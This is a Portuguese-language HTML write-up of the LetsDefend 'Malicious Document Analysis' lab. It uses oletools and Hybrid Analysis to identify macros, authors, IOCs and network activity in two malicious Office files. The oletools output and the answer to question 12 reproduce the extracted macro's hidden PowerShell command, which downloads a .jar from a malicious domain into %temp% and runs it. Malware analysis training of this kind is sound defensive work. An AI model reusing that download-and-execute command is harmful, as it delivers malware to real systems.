@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="pt-br" >
+<head>
+    <!-- META TAGS -->
+    <title>Malicious Document Analysis - LetsDefend | Kauan Manzato</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="title" content="Malicious Document Analysis - LetsDefend | Kauan Manzato"/>
+    <meta name="description" content="Writeup de Malicious Document Analysis - LetsDefend."/>
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:url" content="https://kauanmn.github.io/writeups/letsdefend/malicious_document_analysis.html">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Malicious Document Analysis - LetsDefend | Kauan Manzato">
+    <meta property="og:description" content="Writeup de Malicious Document Analysis - LetsDefend.">
+    <meta property="og:image" content="https://kauanmn.github.io/img/landing_page.png">
+    <meta property="og:image:width" content="500">
+    <meta property="og:image:height" content="500">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:creator" content="@manzatosec"/>
+    <meta property="twitter:domain" content="kauanmn.github.io">
+    <meta property="twitter:url" content="https://kauanmn.github.io/writeups/letsdefend/malicious_document_analysis.html  ">
+    <meta name="twitter:title" content="Malicious Document Analysis - LetsDefend | Kauan Manzato">
+    <meta name="twitter:description" content="Writeup de Malicious Document Analysis - LetsDefend.">
+    <meta name="twitter:image" content="https://kauanmn.github.io/img/landing_page.png">
+    
+    <!-- BOOTSTRAP -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js" integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+
+    <!-- HIGHLIGHT.JS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark-dimmed.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <!-- INTERNO -->
+    <link rel="stylesheet" href="../../../style.css">
+    <link rel="icon" href="../../../img/favicon.svg" type="image/svg+xml">
+    
+</head>
+<body>
+  <div class="col-lg-8 mx-auto p-4 py-md-5">
+    <header class="my-4">
+      <div class="row align-items-center">
+        <div class="col-2 text-center">
+          <a href=".">
+            <button class="btn btn-link rounded-circle p-2 lh-1 me-2" type="button">
+              <svg width="24" height="24">
+                <image xlink:href="../../../img/chevron-left.svg" width="24" height="24">
+              </svg>
+              <span class="visually-hidden">Voltar</span>
+            </button>
+          </a>
+        </div>
+        <div class="col-8 text-center">
+          <h1 class="display-4 fw-bold text-body-emphasis text-center d-inline roxo">Malicious Document Analysis</h1>
+        </div>
+      </div>
+    </header>
+    <main class="bd-content">
+      <div class="container-lg mt-4">
+        <h3>Writeup</h3>
+        <br>
+        <!-- EXERCÍCIO 1 -->
+        <p><strong>1. What is the MD5 value of the "<code>/root/Desktop/QuestionFiles/PO-465514-180820.doc</code>" file?</strong></p>
+        <p>Basta executar o comando <code>md5sum &lt;arquivo&gt;</code> para obter o MD5 do arquivo.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 2 -->
+        <p><strong>2. What is the file type of the "<code>/home/analyst/PO-465514-180820.doc</code>" file?</strong></p>
+        <p>A própria extensão do arquivo é a resposta: <code>doc</code>.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 3 -->
+        <p><strong>3. Does the file "<code>/root/Desktop/QuestionFiles/PO-465514-180820.doc</code>" contain a VBA macro?</strong></p>
+        <p>Para resolver este exercício, obtive o <code>oletools</code> do Github e executei o seguinte comando: <code>python oleid.py &lt;arquivo&gt;</code>, resultando na saída a seguir:</p>
+        <pre><code style="white-space: pre-wrap;">$ python ./oletools/oleid.py PO-465514-180820.doc
+oleid 0.60.1 - http://decalage.info/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+Filename: PO-465514-180820.doc
+WARNING  invalid value for PROJECTDOCSTRING_Id expected 0005 got 0072
+WARNING  For now, VBA stomping cannot be detected for files in memory
+--------------------+--------------------+----------+--------------------------
+Indicator           |Value               |Risk      |Description               
+--------------------+--------------------+----------+--------------------------
+File format         |MS Word 97-2003     |info      |                          
+                    |Document or Template|          |                          
+--------------------+--------------------+----------+--------------------------
+Container format    |OLE                 |info      |Container type            
+--------------------+--------------------+----------+--------------------------
+Application name    |Microsoft Office    |info      |Application name declared 
+                    |Word                |          |in properties             
+--------------------+--------------------+----------+--------------------------
+Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
+                    |Western European    |          |properties                
+                    |(Windows)           |          |                          
+--------------------+--------------------+----------+--------------------------
+Author              |Alexandre Riviere   |info      |Author declared in        
+                    |                    |          |properties                
+--------------------+--------------------+----------+--------------------------
+Encrypted           |False               |none      |The file is not encrypted 
+--------------------+--------------------+----------+--------------------------
+VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
+                    |                    |          |macros. Suspicious        
+                    |                    |          |keywords were found. Use  
+                    |                    |          |olevba and mraptor for    
+                    |                    |          |more info.                
+--------------------+--------------------+----------+--------------------------
+XLM Macros          |No                  |none      |This file does not contain
+                    |                    |          |Excel 4/XLM macros.       
+--------------------+--------------------+----------+--------------------------
+External            |0                   |none      |External relationships    
+Relationships       |                    |          |such as remote templates, 
+                    |                    |          |remote OLE objects, etc   
+--------------------+--------------------+----------+--------------------------</code></pre>
+        <p>De acordo com o resultado, o arquivo possui macros. Então, a resposta é <code>y</code>.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 4 -->
+        <p><strong>4. Some malicious activity occurs when the document file "<code>/root/Desktop/QuestionFiles/PO-465514-180820.doc</code>" is opened. What is the macro keyword that enables this?</strong></p>
+        <p>Ao executar <code>python olevba.py &lt;arquivo&gt;</code>, aparece o seguinte resultado:</p>
+        <pre><code style="white-space: pre-wrap;">+----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Create              |May execute file or a system command through |
+|          |                    |WMI                                          |
+|Suspicious|showwindow          |May hide the application                     |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+</code></pre>
+        <p>A palavra-chave usada para permitir atividades maliciosas quando o arquivo é aberto é <code>Document_open</code>.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 5 -->
+        <p><strong>5. Who is the author of the file "<code>/root/Desktop/QuestionFiles/PO-465514-180820.doc</code>"?</strong></p>
+        <p>Resolvido usando o <code>olemeta</code>:</p>
+        <pre><code style="white-space: pre-wrap;">$ python ./oletools/olemeta.py PO-465514-180820.doc
+olemeta 0.54 - http://decalage.info/python/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+===============================================================================
+FILE: PO-465514-180820.doc
+
+Properties from the SummaryInformation stream:
++---------------------+------------------------------+
+|Property             |Value                         |
++---------------------+------------------------------+
+|codepage             |1252                          |
+|title                |Ipsum.                        |
+|subject              |                              |
+|author               |Alexandre Riviere             |
+|keywords             |                              |
+|comments             |                              |
+|template             |Normal.dotm                   |
+|last_saved_by        |                              |
+|revision_number      |1                             |
+|total_edit_time      |0                             |
+|create_time          |2020-08-18 08:19:00           |
+|last_saved_time      |2020-08-18 08:19:00           |
+|num_pages            |1                             |
+|num_words            |4                             |
+|num_chars            |24                            |
+|creating_application |Microsoft Office Word         |
+|security             |0                             |
++---------------------+------------------------------+
+
+Properties from the DocumentSummaryInformation stream:
++---------------------+------------------------------+
+|Property             |Value                         |
++---------------------+------------------------------+
+|codepage_doc         |1252                          |
+|lines                |1                             |
+|paragraphs           |1                             |
+|scale_crop           |False                         |
+|company              |                              |
+|links_dirty          |False                         |
+|chars_with_spaces    |27                            |
+|shared_doc           |False                         |
+|hlinks_changed       |False                         |
+|version              |983040                        |
++---------------------+------------------------------+</code></pre>
+        <p>O nome do autor é <code>Alexandre Riviere</code>.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 6 -->
+        <p><strong>6. What is the last saved time of the "<code>/root/Desktop/QuestionFiles/PO-465514-180820.doc</code>" file?</strong></p>
+        <p>A análise do <code>olemeta</code> também nos dá a resposta a esta pergunta: <code>2020-08-18 08:19:00</code>.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 7 -->
+        <p><strong>7. The malicious file "<code>Siparis_17.xls</code>" is trying to download files from an address. From which domain is it trying to download the file?</strong></p>
+        <p>Executei o <code>oleid</code> para confirmar que o arquivo possui macros VBA:</p>
+        <pre><code style="white-space: pre-wrap;">$ python ./oletools/oleid.py Siparis_17.xls
+oleid 0.60.1 - http://decalage.info/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+Filename: Siparis_17.xls
+--------------------+--------------------+----------+--------------------------
+Indicator           |Value               |Risk      |Description               
+--------------------+--------------------+----------+--------------------------
+File format         |Unknown file type   |info      |                          
+--------------------+--------------------+----------+--------------------------
+Container format    |Unknown Container   |info      |Container type            
+--------------------+--------------------+----------+--------------------------
+Encrypted           |False               |none      |The file is not encrypted 
+--------------------+--------------------+----------+--------------------------
+VBA Macros          |Yes                 |Medium    |This file contains VBA    
+                    |                    |          |macros. No suspicious     
+                    |                    |          |keyword was found. Use    
+                    |                    |          |olevba and mraptor for    
+                    |                    |          |more info.                
+--------------------+--------------------+----------+--------------------------
+XLM Macros          |No                  |none      |This file does not contain
+                    |                    |          |Excel 4/XLM macros.       
+--------------------+--------------------+----------+--------------------------
+External            |0                   |none      |External relationships    
+Relationships       |                    |          |such as remote templates, 
+                    |                    |          |remote OLE objects, etc   
+--------------------+--------------------+----------+--------------------------</code></pre>
+<br>
+<p>Mesmo que palavras-chave não tenha sido descobertas, é necessário avaliar mais detalhadamente com a ferramenta <code>olevba</code>:</p>
+<pre><code style="white-space: pre-wrap;">+----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|Suspicious|powershell          |May run PowerShell commands                  |
+|Suspicious|executionpolicy     |May run PowerShell commands                  |
+|Suspicious|command             |May run PowerShell commands                  |
+|Suspicious|new-object          |May create an OLE object using PowerShell    |
+|Suspicious|Net.WebClient       |May download files from the Internet using   |
+|          |                    |PowerShell                                   |
+|Suspicious|DownloadFile        |May download files from the Internet using   |
+|          |                    |PowerShell                                   |
+|Suspicious|System              |May run an executable file or a system       |
+|          |                    |command on a Mac (if combined with           |
+|          |                    |libc.dylib)                                  |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |http://hocoso.mobi  |URL                                          |
+|IOC       |6LeGwKmrm.jar       |Executable file name                         |
++----------+--------------------+---------------------------------------------+</code></pre>
+<br>
+<p>Perceba que o arquivo executa alguns comandos maliciosos, conforme esperado. Agora, usamos <code>grep http</code> para checar as URLs acessadas:</p>
+<pre><code style="white-space: pre-wrap;">$ python ./oletools/olevba.py Siparis_17.xls | grep http
+olevba 0.60.2dev5 on Python 3.11.8 - http://decalage.info/python/oletools
+--++-+---++--+--+---cmd|'/c powershell -executionpolicy bypass -W Hidden -command "& { (new-object System.Net.WebClient).DownloadFile(\"http://hocoso.mobi\" ,\" %temp%\\6LeGwKmrm.jar\") }" & %temp%\\6LeGwKmrm.jar'!'K83'13
+|IOC       |http://hocoso.mobi  |URL</code></pre>
+<br>
+<p>E achamos a URL maliciosa: <code>http://hocoso.mobi</code>.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 8 -->
+        <p><strong>8. How many IOCs are in the "<code>Siparis_17.xls</code>" file according to the Olevba tool?</strong></p>
+        <p>Conforme os resultados do <code>olevba</code>, há 2 IOCs para este arquivo: uma URL maliciosa e um arquivo executável.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 9 -->
+        <p><strong>9. The file <code>PO-465514-180820.doc</code> is trying to make a request to a domain ending with ".kz". What is this domain?</strong></p>
+        <p>Ao invés de analisar do zero, eu usarei uma <a href="https://www.hybrid-analysis.com/sample/044aa7e93ec81b297b53aaebad9bbac1a9d754219b001aaf5d4261665af30bc7/6563c488842fcd5cc3051598">análise existente</a> da plataforma Hybrid Analysis. De acordo com a seção <code>Network Analysis</code>, há 5 consultas DNS, uma das quais satisfaz o enunciado acima: <code>www.msbc.kz</code>.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 10 -->
+        <p><strong>10. With which Windows tool are the connection requests made? (file:<code>PO-465514-180820.doc</code>)</strong></p>
+        <p>Na seção <code>Contacted Hosts</code>, podemos notar que o processo associado é o <code>powershell.exe</code>, que é a nossa resposta.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 11 -->
+        <p><strong>11. How many addresses does the file send DNS requests to? (file:<code>PO-465514-180820.doc</code>)</strong></p>
+        <p>De acordo com a seção <code>Network Analysis</code>, há <code>5</code> consultas DNS.</p>
+        <hr><br>
+
+        <!-- EXERCÍCIO 12 -->
+        <p><strong>12. The "<code>Siparis_17.xls</code>" malware document is trying to download a file. With what name does he want to save the file it is trying to download to the device?</strong></p>
+        <p>Novamente, eu vou utilizar uma <a href="https://www.hybrid-analysis.com/sample/288eeeefb4798cc91a55f1bf73a81f961f96dc81439c3f0bce526a7597194888/654b3b19dc006abf40022766">análise existente</a> do arquivo, pesquisando por seu hash MD5. De acordo com a seção <code>Hybrid Analysis</code>, há um comando do <code>powershell.exe</code>:</p>
+
+        <pre><code style="white-space: pre-wrap;">powershell -executionpolicy bypass -W Hidden -command "& { (new-object System.Net.WebClient).DownloadFile(\"http://hocoso.mobi\" ,\" %TEMP%\\6LeGwKmrm.jar\") }"</code></pre>
+
+        <p>Note que o arquivo baixado é salvo com o nome <code>6LeGwKmrm.jar</code>, que é a resposta para a questão.</p>
+      </div>
+    </main>
+  </div>
+</body>
+</html>
